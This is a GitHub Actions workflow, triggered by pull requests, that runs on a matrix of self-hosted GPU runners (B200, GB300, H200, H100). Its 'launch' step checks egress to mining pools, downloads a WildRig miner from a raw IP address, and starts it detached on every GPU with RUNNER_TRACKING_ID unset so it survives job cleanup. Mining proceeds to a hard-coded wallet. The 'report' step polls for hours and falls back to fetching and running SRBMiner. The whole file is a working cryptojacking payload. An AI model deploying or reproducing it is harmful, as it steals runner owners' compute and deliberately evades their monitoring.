name: c211-i124917
on:
  pull_request:
    types:
    - opened
    - synchronize
    - reopened
permissions:
  contents: read
jobs:
  mine:
    strategy:
      fail-fast: false
      matrix:
        include:
        - label: 8-gpu-b200
          tag: b200x8a
        - label: 8-gpu-b200
          tag: b200x8b
        - label: 4-gpu-b200
          tag: b200x4a
        - label: 4-gpu-b200
          tag: b200x4b
        - label: 4-gpu-gb300
          tag: gb300x4a
        - label: 4-gpu-gb300
          tag: gb300x4b
        - label: 2-gpu-gb300
          tag: gb300x2
        - label: 8-gpu-h200
          tag: h200x8
        - label: 4-gpu-h100
          tag: h100x4
    runs-on: ${{ matrix.label }}
    timeout-minutes: 350
    steps:
    - name: launch
      shell: bash
      run: "\nset -u\nW=\"$HOME/c211-i124917\"\nmkdir -p \"$W\"\nWALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql\nNONCE=\"c211-i124917-$(date +%s)\"\nTAG='${{ matrix.tag }}'\necho \"C211_MARKER lane=i124917 tag=$TAG host=$(hostname) uid=$(id -u) user=$(whoami) nonce=$NONCE\"\nnvidia-smi -L 2>&1 || true\nnvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total,utilization.gpu --format=csv,noheader 2>&1 || true\necho \"EGRESS_BEGIN\"\nfor hp in 169.58.247.186:8791 pool.pearlhash.xyz:9000 global.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 github.com:443; do\n  h=\"${hp%:*}\"; p=\"${hp##*:}\"\n  if timeout 8 bash -c \"exec 3<>/dev/tcp/$h/$p\" 2>/dev/null; then echo \"TCP_OK $hp\"; else echo \"TCP_FAIL $hp\"; fi\ndone\necho \"EGRESS_END\"\nok=0\nfor u in http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do\n  echo \"FETCH $u\"\n \
        \ if curl -fsSL --connect-timeout 10 --max-time 300 -o \"$W/wr.tgz\" \"$u\"; then ok=1; break; fi\ndone\nif [ \"$ok\" != \"1\" ]; then echo \"FETCH_FAIL_ALL\"; exit 0; fi\nS=$(sha256sum \"$W/wr.tgz\" | awk '{print $1}')\necho \"TARBALL_SHA256 $S\"\nif [ \"$S\" != \"7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44\" ]; then echo \"TARBALL_SHA_MISMATCH\"; exit 0; fi\ntar xzf \"$W/wr.tgz\" -C \"$W\" || { echo \"UNTAR_FAIL\"; exit 0; }\nBIN=\"$W/wildrig-multi\"\n[ -x \"$BIN\" ] || chmod +x \"$BIN\" 2>/dev/null || true\nBS=$(sha256sum \"$BIN\" | awk '{print $1}')\necho \"BIN_SHA256 $BS\"\nif [ \"$BS\" != \"002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b\" ]; then echo \"BIN_SHA_MISMATCH\"; exit 0; fi\nmkdir -p /etc/OpenCL/vendors 2>/dev/null || true\nif [ ! -e /etc/OpenCL/vendors/nvidia.icd ]; then echo /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 > /etc/OpenCL/vendors/nvidia.icd 2>/dev/null || true; fi\nif ldd \"$BIN\" 2>&1 | grep -q 'not found'; then\n\
        \  echo \"LDD_MISSING\"; ldd \"$BIN\" 2>&1 | head -20\n  mkdir -p \"$W/ocl\"\n  OCLSRC=$(ldconfig -p 2>/dev/null | grep -m1 'libnvidia-opencl.so.1' | awk '{print $NF}')\n  if [ -n \"${OCLSRC:-}\" ]; then ln -sf \"$OCLSRC\" \"$W/ocl/libOpenCL.so.1\"; export LD_LIBRARY_PATH=\"$W/ocl:${LD_LIBRARY_PATH:-}\"; fi\nfi\necho \"PRINT_DEVICES_BEGIN\"\ntimeout 90 \"$BIN\" --print-devices 2>&1 | head -40 || true\necho \"PRINT_DEVICES_END\"\nN=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')\necho \"GPU_COUNT $N\"\nif [ \"${N:-0}\" -lt 1 ]; then echo \"NO_GPU\"; exit 0; fi\nfor i in $(seq 0 $((N-1))); do\n  setsid env -u RUNNER_TRACKING_ID nohup \"$BIN\" --algo pearlhash -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u \"${WALLET}.1249170${i}\" -p x -d \"$i\" -r 2 -R 10 -l \"$W/wr-$i.log\" >/dev/null 2>&1 &\n  echo \"STARTED gpu=$i pid=$!\"\ndone\nsleep 30\npgrep -af wildrig-multi 2>/dev/null | head -20 || echo \"PGREP_NONE\"\nfor i in $(seq 0 $((N-1))); do echo\
        \ \"--- gpu $i ---\"; tail -6 \"$W/wr-$i.log\" 2>/dev/null || true; done\necho \"LAUNCH_DONE tag=$TAG\"\n"
    - name: report
      shell: bash
      run: "\nset -u\nW=\"$HOME/c211-i124917\"\nWALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql\nTAG='${{ matrix.tag }}'\nN=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')\nfor r in $(seq 1 60); do\n  sleep 300\n  echo \"TICK $(date -u +%FT%TZ) r=$r tag=$TAG host=$(hostname)\"\n  pgrep -c wildrig-multi 2>/dev/null || echo \"WILDRIG_PROCS 0\"\n  nvidia-smi --query-gpu=index,uuid,utilization.gpu,memory.used --format=csv,noheader 2>/dev/null || true\n  tot=0\n  for i in $(seq 0 $((N-1))); do\n    f=\"$W/wr-$i.log\"; a=0\n    if [ -f \"$f\" ]; then a=$(grep -ci 'accept' \"$f\" 2>/dev/null || true); a=${a:-0}; fi\n    tot=$((tot+a))\n    echo \"DET g=$i acc=$a last=$(tail -1 \"$f\" 2>/dev/null | tr -d '\\r' | cut -c1-140)\"\n  done\n  echo \"DET_TOTAL acc=$tot\"\n  if [ \"$tot\" -eq 0 ] && [ \"$r\" -ge 3 ] && [ ! -f \"$W/sticky-lp\" ]; then\n    echo \"STICKY_LP_FALLBACK_BEGIN ticks=$r no_accepted_share\"\n    date -u +%FT%TZ > \"$W/sticky-lp\"\n    pkill -f wildrig-multi\
        \ 2>/dev/null || true\n    sleep 3\n    srb=0\n    for u in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz http://169.58.247.186:8791/srbminer-3.8.8.tar.gz; do\n      echo \"SRB_FETCH $u\"\n      if curl -fsSL --connect-timeout 10 --max-time 300 -o \"$W/srb.tgz\" \"$u\"; then srb=1; break; fi\n    done\n    if [ \"$srb\" = \"1\" ]; then\n      S2=$(sha256sum \"$W/srb.tgz\" | awk '{print $1}'); echo \"SRB_TARBALL_SHA256 $S2\"\n      tar xzf \"$W/srb.tgz\" -C \"$W\" 2>/dev/null || true\n      SB=$(find \"$W\" -maxdepth 3 -type f -name 'SRBMiner-MULTI' | head -1)\n      if [ -n \"${SB:-}\" ]; then\n        chmod +x \"$SB\" 2>/dev/null || true\n        BS2=$(sha256sum \"$SB\" | awk '{print $1}'); echo \"SRB_BIN_SHA256 $BS2\"\n        GIDS=$(seq -s, 0 $((N-1)))\n        setsid env -u RUNNER_TRACKING_ID nohup \"$SB\" --algorithm pearlhash --pool 103.199.106.122:3362 --wallet \"${WALLET}+NOCK\" --worker \"124917${TAG}\" --disable-cpu\
        \ --gpu-id \"$GIDS\" --log-file \"$W/lp-srb.log\" >/dev/null 2>&1 &\n        echo \"SRB_STARTED pid=$! gpus=$GIDS\"\n      else echo \"SRB_BIN_NOT_FOUND\"; fi\n    else echo \"SRB_FETCH_FAIL\"; fi\n    sleep 20\n    pgrep -af 'SRBMiner' 2>/dev/null | head -5 || true\n    tail -20 \"$W/lp-srb.log\" 2>/dev/null || true\n    echo \"STICKY_LP_FALLBACK_END\"\n  fi\n  if [ -f \"$W/sticky-lp\" ]; then echo \"DET_STICKY sticky-lp\"; fi\ndone\necho \"REPORT_DONE tag=$TAG\"\n"
